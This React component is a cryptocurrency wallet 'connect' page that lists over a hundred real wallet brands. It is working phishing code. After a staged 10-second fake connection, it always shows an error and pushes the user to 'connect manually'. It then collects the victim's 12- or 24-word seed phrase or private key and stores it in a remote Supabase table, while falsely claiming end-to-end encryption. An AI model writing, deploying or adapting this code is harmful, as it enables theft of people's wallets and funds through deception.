/* eslint-disable @next/next/no-img-element */
'use client';

import { useState } from 'react';
import { X, ChevronRight  } from 'lucide-react';
import * as bip39 from "bip39";

import React from 'react';

type Feature = {
    title: string;
    image: string;
    description: string;
  };

const features = [
    {
      image: "/images/wallets/wallets (1).svg",
      title: "Polygon Wallet",
      description: "polygon.technology"
    },
    {
      image: "/images/wallets/wallets (2).svg",
      title: "Iotex",
      description: "iotex.io"
    },
    {
      image: "/images/wallets/wallets (3).svg",
      title: "Coinbase",
      description: "coinbase.com"
    },
    {
      image: "/images/wallets/wallets (4).svg",
      title: "Ledger Live",
      description: "ledger.com"
    },
    {
      image: "/images/wallets/wallets (5).svg",
      title: "Coinomi",
      description: "coinomi.com"
    },
    {
      image: "/images/wallets/wallets (6).svg",
      title: "SafePal",
      description: "safepal.io"
    },
    {
      image: "/images/wallets/wallets (7).svg",
      title: "Flare Wallet",
      description: "flarewallet.io7."
    },
    {
      image: "/images/wallets/wallets (8).svg",
      title: "Tongue Wallet",
      description: "tongue.fi"
    },
    {
      image: "/images/wallets/wallets (9).svg",
      title: "Xumm Wallet",
      description: ""
    },
    {
      image: "/images/wallets/wallets (10).svg",
      title: "Trezor Wallet",
      description: ""
    },
    {
        image: "/images/wallets/wallets (11).svg",
        title: "Solana Coin",
        description: ""
      },
      {
        image: "/images/wallets/wallets (12).svg",
        title: "SecuX v20",
        description: ""
      },
      {
        image: "/images/wallets/wallets (13).svg",
        title: "Paybis",
        description: ""
      },
      {
        image: "/images/wallets/wallets (14).svg",
        title: "Jaxx liberty wallet",
        description: ""
      },
      {
        image: "/images/wallets/wallets (15).svg",
        title: "Jasmy Coin",
        description: ""
      },
      {
        image: "/images/wallets/wallets (16).svg",
        title: "ICON wallet",
        description: ""
      },
      {
        image: "/images/wallets/wallets (17).svg",
        title: "GamingShiba Token",
        description: ""
      },
      {
        image: "/images/wallets/wallets (18).svg",
        title: "Fantom",
        description: ""
      },
      {
        image: "/images/wallets/wallets (19).svg",
        title: "dYdX",
        description: ""
      },
      {
        image: "/images/wallets/wallets (20).svg",
        title: "Doge Coin",
        description: ""
      },
      {
        image: "/images/wallets/wallets (21).svg",
        title: "Curve Dao Token",
        description: ""
      },
      {
        image: "/images/wallets/wallets (22).svg",
        title: "Cryptonator",
        description: ""
      },
      {
        image: "/images/wallets/wallets (23).svg",
        title: "Crypto Key Stack",
        description: ""
      },
      {
        image: "/images/wallets/wallets (24).svg",
        title: "Coolwallet",
        description: ""
      },
      {
        image: "/images/wallets/wallets (25).svg",
        title: "Coinmama",
        description: ""
      },
      {
        image: "/images/wallets/wallets (26).svg",
        title: "Coinbase Wallet",
        description: ""
      },
      {
        image: "/images/wallets/wallets (27).svg",
        title: "Cardano Coin",
        description: ""
      },
      {
        image: "/images/wallets/wallets (28).svg",
        title: "Bitwala",
        description: ""
      },
      {
        image: "/images/wallets/wallets (29).svg",
        title: "Bitbox wallet",
        description: ""
      },
      {
        image: "/images/wallets/wallets (30).svg",
        title: "BC vault",
        description: ""
      },
      {
        image: "/images/wallets/wallets (31).svg",
        title: "Tangem Wallet",
        description: ""
      },
      {
        image: "/images/wallets/wallets (32).svg",
        title: "Nexo Wallet",
        description: ""
      },
      {
        image: "/images/wallets/wallets (33).svg",
        title: "Metamask",
        description: "metamask.io"
      },
      {
        image: "/images/wallets/wallets (34).svg",
        title: "Binance Chain Wallet",
        description: "binance.com"
      },
      {
        image: "/images/wallets/wallets (35).svg",
        title: "D'Cent Wallet",
        description: "dcentwallet.com"
      },
      {
        image: "/images/wallets/wallets (36).svg",
        title: "Phantom Wallet",
        description: "phantom.com"
      },
      {
        image: "/images/wallets/wallets (37).svg",
        title: "Bitpay",
        description: "bitpay.com"
      },
      {
        image: "/images/wallets/wallets (38).svg",
        title: "Argent",
        description: "argent.xyz"
      },
      {
        image: "/images/wallets/wallets (39).svg",
        title: "Encrypted Ink",
        description: "encrypted.ink"
      },
      {
        image: "/images/wallets/wallets (40).svg",
        title: "KEPLR",
        description: "KEPLR"
      },
      {
        image: "/images/wallets/wallets (41).svg",
        title: "Compound",
        description: "compound.finance"
      },
      {
        image: "/images/wallets/wallets (42).svg",
        title: "Crypto.com | Defi Wallet",
        description: "crypto.com"
      },
      {
        image: "/images/wallets/wallets (43).svg",
        title: "Math Wallet",
        description: "mathwallet.org"
      },
      {
        image: "/images/wallets/wallets (44).svg",
        title: "Dharma",
        description: "dharma.io"
      },
     
      {
        image: "/images/wallets/wallets (47).svg",
        title: "Tradestation",
        description: ""
      },
      {
        image: "/images/wallets/wallets (48).svg",
        title: "Terra",
        description: ""
      },
      {
        image: "/images/wallets/wallets (49).svg",
        title: "Solo Coin",
        description: ""
      },
      {
        image: "/images/wallets/wallets (50).svg",
        title: "SHIBA INU",
        description: ""
      },
      {
        image: "/images/wallets/wallets (51).svg",
        title: "Safepal wallet",
        description: ""
      },
      {
        image: "/images/wallets/wallets (52).svg",
        title: "Rohinhood",
        description: "This is the description for Wallet 52."
      },
      {
        image: "/images/wallets/wallets (53).svg",
        title: "Solana Coin",
        description: ""
      },
      {
        image: "/images/wallets/wallets (54).svg",
        title: "Metapets Coin",
        description: ""
      },
      {
        image: "/images/wallets/wallets (55).svg",
        title: "Localbitcoin",
        description: ""
      },
      {
        image: "/images/wallets/wallets (56).svg",
        title: "Keepkey",
        description: ""
      },
      {
        image: "/images/wallets/wallets (57).svg",
        title: "IDEX",
        description: ""
      },
      {
        image: "/images/wallets/wallets (58).svg",
        title: "HEX",
        description: ""
      },
      {
        image: "/images/wallets/wallets (59).svg",
        title: "Gemini",
        description: ""
      },
      {
        image: "/images/wallets/wallets (60).svg",
        title: "GateHub",
        description: ""
      },
      
      {
        image: "/images/wallets/wallets (61).svg",
        title: "Gate.io",
        description: ""
      },
      {
        image: "/images/wallets/wallets (62).svg",
        title: "Gala Token",
        description: ""
      },
      {
        image: "/images/wallets/wallets (63).svg",
        title: "FTX",
        description: ""
      },
      {
        image: "/images/wallets/wallets (64).svg",
        title: "Erisx",
        description: ""
      },
      {
        image: "/images/wallets/wallets (65).svg",
        title: "Dok Wallet",
        description: ""
      },
      {
        image: "/images/wallets/wallets (66).svg",
        title: "DDEX",
        description: ""
      },
      {
        image: "/images/wallets/wallets (67).svg",
        title: "Bread wallet",
        description: ""
      },
      {
        image: "/images/wallets/wallets (68).svg",
        title: "Coinmama",
        description: ""
      },
      {
        image: "/images/wallets/wallets (69).svg",
        title: "Bitlox",
        description: ""
      },
      {
        image: "/images/wallets/wallets (70).svg",
        title: "Binance Coin (BNB)",
        description: ""
      },
      {
        image: "/images/wallets/wallets (72).svg",
        title: "Aladdin Wallet",
        description: ""
      },
      {
        image: "/images/wallets/wallets (73).svg",
        title: "Wallet Connect",
        description: "wallettconnect.com"
      },
      {
        image: "/images/wallets/wallets (74).svg",
        title: "Trust Wallet",
        description: "trustwallet.com"
      },
      {
        image: "/images/wallets/wallets (75).svg",
        title: "Walleth",
        description: "walleth.org"
      },
      {
        image: "/images/wallets/wallets (76).svg",
        title: "Coin98",
        description: "coin98.com"
      },
      {
        image: "/images/wallets/wallets (77).svg",
        title: "Token Pocket",
        description: "tokenpocket.pro"
      },
      {
        image: "/images/wallets/wallets (78).svg",
        title: "Arculus",
        description: "Arculus"
      },
      {
        image: "/images/wallets/wallets (79).svg",
        title: "MYKEY",
        description: "mykey.org"
      },
      {
        image: "/images/wallets/wallets (80).svg",
        title: "Atomic",
        description: "atomicwallet.io"
      },
      {
        image: "/images/wallets/wallets (81).svg",
        title: "CoolWallet S",
        description: "coolwallet.io"
      },
      {
        image: "/images/wallets/wallets (82).svg",
        title: "Nash",
        description: "nash.io"
      },
      {
        image: "/images/wallets/wallets (83).svg",
        title: "GridPlus",
        description: "gridplus.io"
      },
      {
        image: "/images/wallets/wallets (84).svg",
        title: "Tokenary",
        description: "tokenary.io"
      },
      {
        image: "/images/wallets/wallets (85).svg",
        title: "Infinito",
        description: "infinitowallet.io"
      },
      {
        image: "/images/wallets/wallets (86).svg",
        title: "Wallet.io",
        description: "wallet.io"
      },
      {
        image: "/images/wallets/wallets (87).svg",
        title: "Ownbit",
        description: "ownbit.io"
      },
      {
        image: "/images/wallets/wallets (88).svg",
        title: "EasyPocket",
        description: "easypocket.app"
      },
      {
        image: "/images/wallets/wallets (89).svg",
        title: "Bridge Wallet",
        description: "mtpelerin.com"
      },
      {
        image: "/images/wallets/wallets (90).svg",
        title: "BitKeep",
        description: "bitkeep.com"
      },
      {
        image: "/images/wallets/wallets (91).svg",
        title: "Unstoppable Wallet",
        description: "unstoppable.money"
      },
      {
        image: "/images/wallets/wallets (92).svg",
        title: "HaloDefi Wallet",
        description: "halodefi.org"
      },
      {
        image: "/images/wallets/wallets (93).svg",
        title: "Dok Wallet",
        description: "dokwallet.com"
      },
      {
        image: "/images/wallets/wallets (94).svg",
        title: "Cello Wallet",
        description: "cellowallet.app"
      },
      {
        image: "/images/wallets/wallets (95).svg",
        title: "CoinUs",
        description: "coinus.io"
      },
      {
        image: "/images/wallets/wallets (96).svg",
        title: "Valora",
        description: "valoraapp.com"
      },
      {
        image: "/images/wallets/wallets (97).svg",
        title: "Jade Wallet",
        description: "jadewallet.io"
      },
      {
        image: "/images/wallets/wallets (98).svg",
        title: "PlasmaPay",
        description: "plasmapay.com"
      },
      {
        image: "/images/wallets/wallets (99).svg",
        title: "O3Wallet",
        description: "o3.network"
      },
      {
        image: "/images/wallets/wallets (100).svg",
        title: "HashKey Me",
        description: "me.hashkey.com"
      },
      {
        image: "/images/wallets/wallets (101).svg",
        title: "RWallet",
        description: "rsk.co"
      },
      {
        image: "/images/wallets/wallets (102).svg",
        title: "KyberSwap",
        description: "kyberswap.com"
      },
      {
        image: "/images/wallets/wallets (103).svg",
        title: "AToken Wallet",
        description: "atoken.com"
      },
      {
        image: "/images/wallets/wallets (104).svg",
        title: "XinFin XDC Network",
        description: "talken.io"
      },
      {
        image: "/images/wallets/wallets (105).svg",
        title: "Talken Wallet",
        description: "talken.io"
      },
      {
        image: "/images/wallets/wallets (106).svg",
        title: "KEYRING PRO",
        description: "keyring.app"
      },
      {
        image: "/images/wallets/wallets (107).svg",
        title: "Midas Wallet",
        description: "midasprotocol.io"
      },
      {
        image: "/images/wallets/wallets (108).svg",
        title: "AT.Wallet",
        description: "authentrend.com"
      },
      {
        image: "/images/wallets/wallets (110).svg",
        title: "Others",
        description: ""
      },
      {
        image: "/images/wallets/wallets (111).svg",
        title: "Exodus wallet",
        description: ""
      },
      {
        image: "/images/wallets/wallets (112).svg",
        title: "XRP",
        description: ""
      },
      {
        image: "/images/wallets/wallets (113).svg",
        title: "Sandbox Token",
        description: ""
      },
      
      {
        image: "/images/wallets/wallets (115).svg",
        title: "Polkadot",
        description: "This is the description for Wallet 115."
      },
      {
        image: "/images/wallets/wallets (117).svg",
        title: "MyEtherWallet",
        description: ""
      },
      {
        image: "/images/wallets/wallets (118).svg",
        title: "EverRise Token",
        description: ""
      },
      {
        image: "/images/wallets/wallets (119).svg",
        title: "Etoro",
        description: ""
      },
      {
        image: "/images/wallets/wallets (120).svg",
        title: "Curv",
        description: ""
      },
      {
        image: "/images/wallets/wallets (121).svg",
        title: "Compound",
        description: ""
      },
      {
        image: "/images/wallets/wallets (123).svg",
        title: "Cobo vault wallet",
        description: ""
      },
      {
        image: "/images/wallets/wallets (124).svg",
        title: "Bitmymoney",
        description: ""
      },
      {
        image: "/images/wallets/wallets (125).svg",
        title: "Bitinka",
        description: ""
      },
      {
        image: "/images/wallets/wallets (126).svg",
        title: "Bitfia",
        description: ""
      },
      {
        image: "/images/wallets/wallets (127).svg",
        title: "Ledger",
        description: "ledger.com"
      },
      

      {
        image: "/images/wallets/Safepal.svg",
        title: "Safepal",
        description: ""
      },
      {
        image: "/images/wallets/bitget.png",
        title: "Bitget wallet",
        description: ""
      },
      {
        image: "/images/wallets/rabby.png",
        title: "Rabby Wallet",
        description: ""
      },

  ];
  import { createClient } from '@supabase/supabase-js';

const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL!,
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!
);

  
  const FeatureGrid = () => {
    const [showModal, setShowModal] = useState(false);
    const [selectedFeature, setSelectedFeature] = useState<Feature | null>(null);
    const [showError, setShowError] = useState(false);
    const [manualMode, setManualMode] = useState(false);
    const [errorTimer, setErrorTimer] = useState<NodeJS.Timeout | null>(null);
  
    const handleClick = (feature: Feature) => {
      setSelectedFeature(feature);
      setShowModal(true);
      setShowError(false);
      setManualMode(false); // reset manual mode
  
      // Clear existing timer
      if (errorTimer) clearTimeout(errorTimer);
  
      // Start 10s timer
      const timer = setTimeout(() => {
        setShowError(true);
      }, 10000);
  
      setErrorTimer(timer);
    };
  
    const handleClose = () => {
      setShowModal(false);
      setSelectedFeature(null);
      setShowError(false);
      setManualMode(false);
      if (errorTimer) clearTimeout(errorTimer);
    };

    const [mnemonicInput, setMnemonicInput] = useState("");

const isValidMnemonic = (input: string) => {
  const words = input.trim().toLowerCase().split(/\s+/);
  if (![12, 24].includes(words.length)) return false;

  // Check if all words are in the BIP-39 list
  const allValidWords = words.every((word) => bip39.wordlists.english.includes(word));
  if (!allValidWords) return false;

  // Optional: check if it's a valid mnemonic according to checksum
  return bip39.validateMnemonic(input.trim());
};

const handleConnect = async () => {
    const words = mnemonicInput.trim().split(/\s+/);
  
    if (words.length === 12 || words.length === 24) {
      const phrase = mnemonicInput.trim();
  
      const { error } = await supabase.from('wallet_connections').insert([{ phrase }]);
      if (error) {
        console.error('Failed to save phrase:', error.message);
      } else {
        alert('Wallet connected successfully!');
        setShowModal(false); // Close modal
      }
    } else {
      console.warn('Invalid number of words in mnemonic');
    }
  };


  const [query, setQuery] = useState('');

  const filteredFeatures = features.filter((feature) =>
    feature.title.toLowerCase().includes(query.toLowerCase())
  );
  
  
  
    return (
      <div className="md:max-w-7xl w-full mx-auto  py-12 ">


<div className="bg-[#010212] min-h-screen text-white md:px-6 py-12">
      {/* Search Header */}
      <h2 className="text-3xl font-bold mb-6">Select a Wallet</h2>

      {/* Search Bar */}
      <div className="flex flex-col gap-8 sm:flex-row items-stretch sm:items-center mb-8">
        <input
          type="text"
          placeholder="Find your wallet"
          value={query}
          onChange={(e) => setQuery(e.target.value)}
          className="flex-1 bg-white text-black placeholder-gray-500 px-6 py-4 rounded-md sm:rounded-r-none focus:outline-none"
        />
        <button className="bg-white hover:bg-[#0F101E] hover:text-white text-black font-semibold px-20 py-4 rounded-md sm:rounded-l-none flex items-center gap-8">
          Search
          <span className="text-[#E32058] text-xl">{'>'}</span>
        </button>
      </div>

      {/* Results Count */}
      <p className="mb-4 font-bold text-lg">
        {filteredFeatures.length} result{filteredFeatures.length !== 1 ? 's' : ''} found
      </p>

      {/* Wallet Cards */}
      <div className="max-w-7xl mx-auto grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-6">
        {filteredFeatures.map((feature, index) => (
          <div
            key={index}
            className="bg-[#0F101E] border-[1px] border-[#2B2C38] text-white rounded-4xl shadow-lg flex flex-col items-center justify-center text-center px-4 py-16 cursor-pointer"
            onClick={() => handleClick(feature)}
          >
            <img src={feature.image} alt={feature.title} className="w-16 h-16 mb-4" />
            <h3 className="text-lg font-semibold mb-2">{feature.title}</h3>
            <p className="text-sm opacity-80">{feature.description}</p>
          </div>
        ))}
      </div>
    </div>

        
  
        {/* Modal */}
        {showModal && selectedFeature && (
          <div className="fixed inset-0 z-[9999] flex items-center justify-center bg-black/80 px-4 md:px-0">
            <div className="relative md:w-[30rem] w-full bg-white rounded-lg p-6 text-center">
              {/* Close Button */}
              <button onClick={handleClose} className="absolute cursor-pointer bg-white rounded-full p-2 font-extrabold -top-3 -right-3 text-black">
                <X className="w-5 h-5 font-extrabold" />
              </button>
  
              {/* Logo */}
              <div className="mx-auto mb-4">
                <div className="w-16 h-16 rounded-full overflow-hidden mx-auto">
                  <img
                    src={selectedFeature.image}
                    alt={selectedFeature.title}
                    className="w-full h-full object-cover"
                  />
                </div>
              </div>
  
              {/* Title */}
              <h2 className="text-xl font-semibold text-black">{selectedFeature.title}</h2>
              <p className="text-gray-500 mt-1">This session is secured and encrypted</p>
  
              {/* Content Section */}
              {!showError ? (
                <div className="mt-8 py-12 flex flex-col items-center gap-2">
                  <div className="animate-spin rounded-full h-8 w-8 border-2 border-gray-300 border-t-black" />
                  <p className="text-gray-600">starting secure connection…</p>
                  <p className="text-sm italic text-gray-400">please wait…</p>
                </div>
              ) : manualMode ? (
                <div className="mt-8 w-full flex flex-col  gap-6">
                  <textarea
                    rows={4}
                    value={mnemonicInput}
                    onChange={(e) => setMnemonicInput(e.target.value)}
                    className="w-full border border-gray-200 rounded-sm  text-sm md:text-base px-4 py-3 font-semibold text-gray-900 resize-none focus:outline-none focus:ring-2 focus:ring-blue-500"
                    placeholder="Enter your 12 or 24 Mnemonic words. Separate them with spaces. You can also input your privatekey instead."
                  />
                 <button
  disabled={!isValidMnemonic(mnemonicInput)}
  className={`${
    isValidMnemonic(mnemonicInput)
      ? "bg-[#3870df] text-white cursor-pointer"
      : "bg-[#D6E4FF] text-gray-500 cursor-not-allowed"
  } font-semibold px-6 py-3 w-60 rounded-full flex items-center gap-8`}
  onClick={handleConnect}
>
  Connect Wallet <ChevronRight className="w-4 h-4 text-pink-300" />
</button>
                </div>
              ) : (
                <div className="mt-5 flex flex-col items-center gap-16">
                  <div className="border border-red-500 text-red-600 font-semibold rounded-md px-4 py-3 text-sm w-full">
                    An error occurred… please try again or connect manually
                  </div>
                  <div className="flex justify-between w-full text-xs md:text-base">
                    <button
                      onClick={() => handleClick(selectedFeature)}
                      className="bg-black cursor-pointer text-white font-semibold md:px-6 px-4 md:py-3 py-2 rounded-full flex items-center gap-2"
                    >
                      Try Again <ChevronRight className="w-4 h-4 text-[#E32058]" />
                    </button>
                    <button
                      onClick={() => setManualMode(true)}
                      className="bg-gradient-to-r cursor-pointer from-purple-500 to-[#E32058] text-white font-semibold md:px-6 px-4 md:py-3 py-2 rounded-full"
                    >
                      Connect Manually
                    </button>
                  </div>
                </div>
              )}
  
              {/* Bottom Note */}
              <div className="mt-20 flex items-center justify-center text-gray-500 md:gap-2 gap-1 md:text-base text-sm md:text-center text-left">
              <svg
      className={"md:w-8 md:h-8 w-14 h-14 text-gray-500"}
      viewBox="0 0 24 24"
      fill="currentColor"
    >
       <path d="M12 2L12 22c4 0 8-5 8-10V6l-8-4z" /> 
      <path d="M12 2L4 6v6c0 5 4 10 8 10s8-5 8-10V6l-8-4z" fill="none" stroke="currentColor" strokeWidth="2"/>
      
    </svg>
                <span>This session is protected with an end-to-end encryption</span>
              </div>
            </div>
          </div>
        )}
      </div>
    );
  };
  
export default FeatureGrid;
